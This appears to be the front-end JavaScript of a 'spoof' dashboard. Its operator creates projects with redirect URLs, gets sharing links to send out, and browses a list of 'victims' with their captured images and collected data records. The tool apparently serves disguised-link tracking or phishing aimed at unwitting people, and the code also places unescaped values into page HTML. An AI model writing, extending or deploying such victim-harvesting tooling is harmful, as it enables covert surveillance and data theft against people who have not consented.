// DOM Elements

const projectFormContainer = document.querySelector(
    ".project__form__container"
  ),
  newProjectButton = document.querySelector("#new-project"),
  projectForm = document.getElementById("project-form"),
  projectFormClose = document.querySelector("#project-form-close"),
  nameField = document.getElementById("projectName"),
  urlField = document.getElementById("redirectURL"),
  alertBox = document.getElementById("message"),
  logoutButton = document.getElementById("logout"),
  greet = document.querySelector("#greet"),
  projectCount = document.querySelector("#project-count"),
  projectsContainer = document.querySelector(".projects__list"),
  projectInfo = document.querySelector(".project__info"),
  victimsCount = document.querySelector("span#victims-count"),
  victimsContainer = document.querySelector(".victims__list"),
  victimContainer = document.querySelector(".victim__container");
// load user info, projects
var PROJECTS, VICTIMS, USER, USER_DIV;
var timeout;
// Utility Functions

const getSharingURL = (projectId) =>
  ` ${window.location.origin}/redirect?r_id=${projectId}&u_id=${USER}`;

async function request(url, method, payload) {
  const accessToken = localStorage.getItem("accessToken");
  const username = localStorage.getItem("username");

  if (!accessToken) return undefined;

  try {
    const response = await fetch(url, {
      method,
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": "application/json",
        "Custom-Username": username,
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      return null;
    }

    const data = await response.json();
    return data;
  } catch (error) {
    console.log("error fetching data", error);
  }
}

const toggleForm = () => {
  projectFormContainer.classList.toggle("visible");
};

const isValidUrl = (string) => {
  try {
    new URL(string);
    return true;
  } catch (err) {
    return false;
  }
};

const createProject = async (e) => {
  e.preventDefault();

  const name = nameField.value;
  const url = urlField.value;

  if (!name || !url) return;
  if (!isValidUrl(url)) {
    alertBox.innerText = "Enter valid url";
    alertBox.parentElement.classList.add("visible");

    if (timeout) {
      clearTimeout(timeout);
      timeout = null;
    }

    timeout = setTimeout(() => {
      alertBox.parentElement.classList.remove("visible");
    }, 2000);

    return;
  }

  const data = {
    name,
    url,
  };

  const response = await request("/spoof/dashboard/api/project", "POST", data);

  if (response.success) {
    alertBox.textContent = response.message;
    alertBox.parentElement.classList.add("visible");

    setTimeout(() => {
      window.location.reload();
    }, 2000);
  }
};
const expandVictim = (vId) => {
  victimContainer.innerHTML = "";

  USER_DIV = document.createElement("div");
  const victim = VICTIMS.find((v) => v.victim_id === vId);

  const img = document.createElement("img");
  img.src = victim.userImages;

  var wrapper = document.createElement("div");
  wrapper.classList.add("jsontreej_tree__wrapper", "slick__scroll");
  // Create json-tree
  var tree = jsonTree.create(victim, wrapper);

  //
  USER_DIV.appendChild(img);
  USER_DIV.appendChild(wrapper);
  victimContainer.appendChild(USER_DIV);
};

const showVictims = async (projectId) => {
  const response = await request(
    "/spoof/dashboard/api/victims?projectId=" + projectId,
    "GET"
  );
  if (response.success) {
    VICTIMS = response.victims;
    victimsContainer.innerHTML = "";
    // update project list
    victimsCount.textContent = VICTIMS.length;

    VICTIMS.forEach((v) => {
      const victimCard = document.createElement("a");
      victimCard.setAttribute("victim_id", v.victim_id);
      victimCard.classList.add("victims__list__item");

      const imageSrc = v.userImages
        ? "/images/" + v.userImages
        : "/images/user-flat.png";
      v["userImages"] = imageSrc;
      const pContent = `
    <div>
      <img src="${imageSrc}">
      <p>Date: ${new Date(v.date_created).toLocaleString()}</p>
    </div>
    `;
      victimCard.innerHTML = pContent;
      victimCard.onclick = (e) => {
        document
          .querySelector(".victims__list__item.active")
          ?.classList.remove("active");
        victimCard.classList.add("active");
        expandVictim(v.victim_id);
      };

      victimsContainer.appendChild(victimCard);
    });
  }
};

const showProjects = () => {
  PROJECTS.map((projectData) => {
    const { date_created, name, url, project_id } = projectData;
    const date = new Date(date_created).toDateString();
    const projectName = name.toUpperCase();
    const projectCard = document.createElement("a");
    projectCard.classList.add("projects__list__item");
    const pContent = `
    <div>
      <p>${projectName}</p>
      <span>${date}</span>
    </div>
    `;
    projectCard.innerHTML = pContent;
    projectCard.setAttribute("project_id", project_id);

    projectCard.onclick = (e) => {
      victimContainer.innerHTML = "";
      document
        .querySelector(".projects__list__item.active")
        ?.classList.remove("active");
      // update project details
      projectCard.classList.add("active");
      projectInfo.innerHTML = `
      <p><strong>Name: </strong>${projectName}</p>
      <p><strong>Created On: </strong>${date}</p>
      <p><strong>URL: </strong>${url}</p>
      <p><strong>Sharing Link: </strong> ${getSharingURL(project_id)}</p>
      `;
      showVictims(project_id);
    };

    projectsContainer.appendChild(projectCard);
  });
};

const logoutUser = async (e) => {
  e.preventDefault();

  const response = await request("/spoof/api/logout", "POST");

  if (response.success) {
    // delete accesstoken
    localStorage.removeItem("accessToken");
    localStorage.removeItem("username");
    window.location.href = "/spoof/login";
  }
};

// Event Handlers

async function Start() {
  const dashboardData = await request("/spoof/dashboard/api/data", "GET");
  if (!dashboardData) return;

  const { message, projects, username } = dashboardData;
  PROJECTS = projects;
  USER = username;

  greet.textContent = message;
  projectCount.textContent = projects.length;

  projectForm.onsubmit = createProject;
  projectFormClose.onclick = toggleForm;
  newProjectButton.onclick = toggleForm;
  logoutButton.onclick = logoutUser;

  showProjects();
}

Start();
